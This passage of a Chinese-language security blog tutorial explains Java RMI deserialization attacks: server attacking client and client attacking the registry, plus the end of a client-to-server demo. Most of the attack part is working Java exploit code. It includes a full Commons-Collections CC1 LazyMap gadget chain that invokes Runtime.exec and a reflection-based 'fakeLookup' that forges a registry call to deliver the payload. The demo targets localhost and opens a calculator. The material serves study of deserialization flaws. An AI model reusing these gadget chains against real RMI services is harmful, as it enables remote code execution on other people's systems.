<span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (Map) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        Class&lt;?&gt; aihClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstuctor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        aihConstuctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih2</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);</span><br><span class="line">        <span class="keyword">return</span> aih2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>先运行Server端启动代码，再运行Client端启动代码，发现报下面的错误：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694944516004-d0135740-81c7-4fb4-a772-1a8c77f5968b.png#averageHue=%23c0965c&clientId=ueff18163-e590-4&from=paste&height=162&id=u2fc443d3&originHeight=203&originWidth=1399&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40660&status=done&style=none&taskId=ub6df8812-56df-4d26-bd8a-f734f2d2f5e&title=&width=1119.2" alt="image.png"><br>看报错很简单，Server端不支持Object类型参数的函数，那是不是就利用不了了？<br>不卖关子，在这个<a target="_blank" rel="noopener" href="https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides%20Exploiting%20RMI%20Services.pdf">PPT</a>中介绍了4种方式，绕过判断实现反序列化，这里我们选最简单的debugger方法。<br>正常启动Server端启动代码，DEBUG启动Client端启动代码，hook点在invokeRemoteMethod<br>右键method，点击Evaluate Expression，会弹出修改method的对话框<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694945020036-b6f51293-2249-4990-87b7-4a36f8cee15d.png#averageHue=%23669a50&clientId=ueff18163-e590-4&from=paste&height=794&id=uec672a58&originHeight=992&originWidth=1965&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=143004&status=done&style=none&taskId=u9d29a978-e94a-4d0f-900e-44a745b0171&title=&width=1572" alt="image.png"><br>把method改成参数为HelloObject类型的漏洞函数，点击Evaluate赋值。<br>注意：这里能改是因为Client端的接口既写了参数Object的函数，又写了参数HelloObject的函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694945180999-77be06d6-1ccf-43c1-a134-2ab47419d5bf.png#averageHue=%23090705&clientId=ueff18163-e590-4&from=paste&height=585&id=u5ad19ec1&originHeight=731&originWidth=1001&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=72363&status=done&style=none&taskId=u7f4a44f3-5002-49bd-a387-28ade296152&title=&width=800.8" alt="image.png"><br>一路consume，也成功执行CC1代码。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694945424011-cec6eebd-4ccd-4ba5-b73a-0da12ecdb47d.png#averageHue=%23644a22&clientId=ueff18163-e590-4&from=paste&height=712&id=u9fed2671&originHeight=890&originWidth=1895&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=188726&status=done&style=none&taskId=u74611c32-8fff-44be-8ce6-14d377348ec&title=&width=1516" alt="image.png"></p>
<h2 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h2><p>攻击原理：客户端调用远程对象的函数，函数在服务端执行完毕以后，函数的返回结果会在服务端序列化，通过网络连接传输，再在客户端反序列化，那么如果恶意的服务端返回一个恶意的函数执行结果，客户端就会受到反序列化攻击。和客户端攻击服务端是同一个流程下的问题。<br><strong>详情见：客户端调用远程对象的方法并获取返回结果</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">vulFunc</span><span class="params">()</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObjectInterface</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upS</span> <span class="operator">=</span> s.toUpperCase();</span><br><span class="line">        System.out.println(upS);</span><br><span class="line">        <span class="keyword">return</span> upS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">vulFunc</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">return</span> getCCPayload();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getCCPayload</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//CC1-LazyMap</span></span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (Map) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        Class&lt;?&gt; aihClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstuctor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        aihConstuctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih2</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);</span><br><span class="line">        <span class="keyword">return</span> aih2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, MalformedURLException, AlreadyBoundException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">vulFunc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 2. get the stub of remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteObjectInterface) registry.lookup(<span class="string">&quot;remoteObject&quot;</span>);</span><br><span class="line">        <span class="comment">// 3. invoke the method of remote object</span></span><br><span class="line">        stub.vulFunc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>先运行Server端的启动代码，再运行Client端的启动代码，成功执行CC1命令。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1695110240928-9e8ce206-fae1-4f79-8d0a-8305d8f35eb6.png#averageHue=%23584225&clientId=u67350b10-c0b9-4&from=paste&height=1294&id=ub779edf0&originHeight=1617&originWidth=2862&originalType=binary&ratio=2&rotation=0&showTitle=false&size=395074&status=done&style=none&taskId=u7a6149c2-0759-4ae8-b322-db0063f83a6&title=&width=2289.6" alt="image.png"></p>
<h2 id="客户端攻击注册中心"><a href="#客户端攻击注册中心" class="headerlink" title="客户端攻击注册中心"></a>客户端攻击注册中心</h2><p>攻击原理：客户端主要是lookup和unbind，这两个函数接收一个客户端传过来的String类型的参数，然后去查找对应的绑定的远程对象是否存在，但是实际上，<strong>注册中心是先把传过来的String类型参数反序列化，再进行类型转换的</strong>，在类型转换之前反序列化攻击就可以完成，那么我们如果lookup传一个恶意对象，注册中心就会反序列化RCE。<br><strong>详情见：注册中心收到查询请求并返回远程对象的代理</strong><br>需要注意的是，lookup方法本身并不支持传输一个恶意对象，所以需要我们自己实现封装一个lookup方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObjectInterface</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upS</span> <span class="operator">=</span> s.toUpperCase();</span><br><span class="line">        System.out.println(upS);</span><br><span class="line">        <span class="keyword">return</span> upS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 2. get the stub of remote object</span></span><br><span class="line"><span class="comment">//        RemoteObjectInterface stub = (RemoteObjectInterface) registry.lookup(&quot;remoteObject&quot;);</span></span><br><span class="line">        fakeLookup(registry);</span><br><span class="line">        <span class="comment">// 3. invoke the method of remote object</span></span><br><span class="line"><span class="comment">//        stub.sayHello(&quot;I&#x27;m jasper you motherfucker.&quot;);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getCCPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC1-LazyMap</span></span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (Map) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        Class&lt;?&gt; aihClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstuctor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        aihConstuctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih2</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);</span><br><span class="line">        <span class="keyword">return</span> aih2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fakeLookup</span><span class="params">(Registry registry)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取ref</span></span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br><span class="line">        <span class="comment">//获取operations</span></span><br><span class="line"></span><br><span class="line">        Field[] fields_1 = registry.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 伪造lookup的代码，去伪造传输信息</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(getCCPayload());</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>先运行Server端启动代码，再运行Client端启动代码模仿lookup操作，成功执行CC1。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1695114761061-efae3aa5-7dbd-4c64-9913-8929f3143f44.png#averageHue=%23594528&clientId=u67350b10-c0b9-4&from=paste&height=1150&id=u9e3f090e&originHeight=1438&originWidth=2862&originalType=binary&ratio=2&rotation=0&showTitle=false&size=370990&status=done&style=none&taskId=ua45b00d5-0c96-4a14-8d58-88c2e65db67&title=&width=2289.6" alt="image.png"></p>
